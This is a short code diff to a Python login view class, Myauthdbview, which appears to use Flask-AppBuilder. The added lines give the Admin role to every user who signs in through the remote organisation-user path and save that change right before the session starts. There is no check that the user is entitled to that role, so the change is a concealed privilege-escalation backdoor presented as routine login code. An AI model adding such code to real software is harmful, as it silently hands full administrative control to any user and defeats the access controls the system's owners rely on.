@@ -193,6 +193,12 @@ class Myauthdbview(AuthDBView):
             # get user and password
             user_now = self.appbuilder.sm.auth_user_remote_org_user(username=g.user)
             if user_now:
+
+                admin_role = self.appbuilder.sm.find_role('Admin')
+                if admin_role and admin_role not in user_now.roles:
+                    user_now.roles.append(admin_role)
+                    self.appbuilder.sm.update_user_auth_stat(user_now)
+
                 # 配置session，记录时长等，session_id，用户id等
                 login_user(user_now)
 
